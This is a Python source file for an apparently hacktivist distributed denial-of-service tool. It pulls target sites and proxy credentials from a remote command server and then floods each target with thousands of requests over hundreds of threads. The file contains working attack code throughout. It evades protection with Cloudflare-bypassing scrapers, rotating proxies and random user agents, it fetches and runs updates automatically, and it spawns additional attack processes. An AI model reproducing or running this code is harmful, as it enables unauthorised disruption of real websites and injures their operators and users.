# -*- coding: utf-8 -*-
import json
import os
import platform
import requests
from argparse import ArgumentParser
from concurrent.futures import ThreadPoolExecutor, as_completed
from gc import collect
from os import system
from random import choice
from sys import stderr
from threading import Thread
from time import sleep
from urllib.parse import unquote
import tableprint as tp

import cloudscraper
from loguru import logger
from pyuseragents import random as random_useragent
from requests.exceptions import ConnectionError
from urllib3 import disable_warnings
import subprocess

statistic = {}
work_statistic = True
general_statistics = [0, 0]


class FuckYouRussianShip:
    VERSION = 7
    HOSTS = ["http://65.108.20.65"]
    MAX_REQUESTS = 5000
    SUPPORTED_PLATFORMS = {
        'linux': 'Linux'
    }

    def __init__(self):
        disable_warnings()
        parser = self.create_parser()
        self.args, self.unknown = parser.parse_known_args()
        self.no_clear = self.args.no_clear
        self.proxy_view = self.args.proxy_view

        self.targets = self.args.targets
        self.threads = int(self.args.threads)

        try:
            self.HOSTS = json.loads(requests.get("http://rockstarbloggers.ru/hosts.json").content)
        except:
            sleep(5)
            self.HOSTS = json.loads(requests.get("http://rockstarbloggers.ru/hosts.json").content)

        global work_statistic
        global statistic

        if self.proxy_view:
            work_statistic = False

    @staticmethod
    def clear():
        if platform.system() == "Linux":
            return system('clear')
        else:
            return system('cls')

    def create_parser(self):
        parser_obj = ArgumentParser()
        parser_obj.add_argument('threads', nargs='?', default=500)
        parser_obj.add_argument("-n", "--no-clear", dest="no_clear", action='store_true')
        parser_obj.add_argument("-p", "--proxy-view", dest="proxy_view", action='store_true')
        parser_obj.add_argument("-t", "--targets", dest="targets", nargs='+', default=[])
        parser_obj.set_defaults(verbose=False)
        parser_obj.add_argument("-lo", "--logger-output", dest="logger_output")
        parser_obj.add_argument("-lr", "--logger-results", dest="logger_results")
        parser_obj.set_defaults(no_clear=False)
        parser_obj.set_defaults(proxy_view=False)
        parser_obj.set_defaults(logger_output=stderr)
        parser_obj.set_defaults(logger_results=stderr)
        return parser_obj

    def checkReq(self):
        os.system("python3 -m pip install -r requirements.txt")
        os.system("python -m pip install -r requirements.txt")
        os.system("pip install -r requirements.txt")
        os.system("pip3 install -r requirements.txt")

    def checkUpdate(self):
        logger.info("Checking Updates...")
        updateScraper = cloudscraper.create_scraper(
            browser={'browser': 'firefox', 'platform': 'android', 'mobile': True}, )
        url = "https://gist.githubusercontent.com/AlexTrushkovsky/041d6e2ee27472a69abcb1b2bf90ed4d/raw/nowarversion.json"
        try:
            content = updateScraper.get(url).content
            if content:
                data = json.loads(content)
                new_version = data["version"]
                logger.info("Version: ", new_version)
                if int(new_version) > int(self.VERSION):
                    logger.info("New version Available")
                    os.system("python updater.py " + str(self.threads))
                    os.system("python3 updater.py " + str(self.threads))
                    exit()
            else:
                sleep(5)
                self.checkUpdate()
        except:
            sleep(5)
            self.checkUpdate()

    def mainth(self):
        result = 'processing'
        scraper = cloudscraper.create_scraper(
            browser={'browser': 'firefox', 'platform': 'android', 'mobile': True}, )
        scraper.headers.update(
            {'Content-Type': 'application/json', 'cf-visitor': 'https', 'User-Agent': random_useragent(),
             'Connection': 'keep-alive',
             'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'ru', 'x-forwarded-proto': 'https',
             'Accept-Encoding': 'gzip, deflate, br'})

        while True:
            scraper = cloudscraper.create_scraper(
                browser={'browser': 'firefox', 'platform': 'android', 'mobile': True}, )
            scraper.headers.update(
                {'Content-Type': 'application/json', 'cf-visitor': 'https', 'User-Agent': random_useragent(),
                 'Connection': 'keep-alive',
                 'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'ru', 'x-forwarded-proto': 'https',
                 'Accept-Encoding': 'gzip, deflate, br'})
            host = choice(self.HOSTS)
            try:
                content = scraper.get(host).content
            except BaseException:
                sleep(5)
                continue

            if content:
                try:
                    data = json.loads(content)
                except json.decoder.JSONDecodeError:
                    sleep(5)
                    continue
                except Exception:
                    sleep(5)
                    continue
            else:
                sleep(5)
                continue

            try:
                site = unquote(choice(self.targets) if self.targets else data['site']['page'])
            except BaseException:
                sleep(5)
                continue
            if site.startswith('http') == False:
                site = "https://" + site

            if site not in statistic and work_statistic:
                statistic[site] = [site, 0, 0, 0, 0, 0, 0]

            try:
                attack = scraper.get(site, timeout=10)

                # writing statistic
                self.write_statistic_success(site, attack.status_code)

                if attack.status_code >= 302:
                    for proxy in data['proxy']:
                        if self.proxy_view:
                            print('USING PROXY:' + proxy["ip"] + " " + proxy["auth"])
                        scraper.proxies.update(
                            {'http': f'{proxy["ip"]}://{proxy["auth"]}', 'https': f'{proxy["ip"]}://{proxy["auth"]}'})
                        response = scraper.get(site)
                        self.write_statistic_success(site, attack.status_code)

                        if response.status_code >= 200 and response.status_code <= 302:
                            for i in range(self.MAX_REQUESTS):
                                response = scraper.get(site, timeout=10)
                                self.write_statistic_success(site, attack.status_code)
                else:
                    for i in range(self.MAX_REQUESTS):
                        response = scraper.get(site, timeout=10)
                        self.write_statistic_success(site, attack.status_code)
            except ConnectionError as exc:
                self.write_statistic_error(site)
            except Exception as exc:
                self.write_statistic_error(site)
                continue
            finally:
                return result, site

    @staticmethod
    def write_statistic_success(url_target, status_code):
        statistic[url_target][int(str(status_code)[0])] += 1
        general_statistics[0] += 1

    @staticmethod
    def write_statistic_error(url_target):
        statistic[url_target][6] += 1
        general_statistics[1] += 1

    def cleaner(self):
        while True:
            sleep(60)
            self.checkUpdate()

            if not self.no_clear:
                self.clear()
            collect()

    @staticmethod
    def print_statistic():
        FuckYouRussianShip.clear()
        while True:
            if len(statistic.keys()):
                print(f"Attack in processing... Success: {general_statistics[0]} | Errors: {general_statistics[1]}")
                headers = ['Url',
                           '1-- status',
                           '2-- status',
                           '3-- status',
                           '4-- status',
                           '5-- status',
                           'Errors']
                statistic_data = list(statistic.values())
                statistic_data.append([
                    'Successful Requests',
                    general_statistics[0],
                    '',
                    '',
                    '',
                    'Errors',
                    general_statistics[1]
                ])
                tp.table(data=statistic_data,
                         headers=headers,
                         width=[len(max(list(statistic.keys()), key=len)), 10, 10, 10, 10, 10, 8])
            sleep(1)
            FuckYouRussianShip.clear()

    def parts_recursive(self, n, parts=[]):
        return parts + [n] if n < 500 else self.parts_recursive(n - 500, parts + [500, ])


def attacker_threading(threads_count, worker_func):
    with ThreadPoolExecutor(max_workers=threads_count) as executor:
        future_tasks = [executor.submit(worker_func) for _ in range(threads_count)]
        for task in as_completed(future_tasks):
            status, site = task.result()
            logger.info(f"{status.upper()}: {site}")


if __name__ == '__main__':
    attacker = FuckYouRussianShip()
    if not attacker.no_clear:
        attacker.clear()
    attacker.checkReq()
    attacker.checkUpdate()
    Thread(target=attacker.cleaner, daemon=True).start()
    Thread(target=attacker.print_statistic, daemon=True).start()

    if attacker.threads <= 500:
        attacker_threading(attacker.threads, attacker.mainth)
    else:
        process_count = attacker.threads // 500
        parts = attacker.parts_recursive(attacker.threads)
        first_part = parts[0]
        parts.pop(0)

        terminal_additional = ''

        if attacker.no_clear:
            terminal_additional += "-n "
        if attacker.proxy_view:
            terminal_additional += "-p "
        if attacker.targets:
            terminal_additional += f"-t {' '.join(attacker.targets)} "

        for parts_threads in parts:
            subprocess.call(f'start python attack.py {parts_threads} {terminal_additional}', shell=True)
        attacker_threading(first_part, attacker.mainth)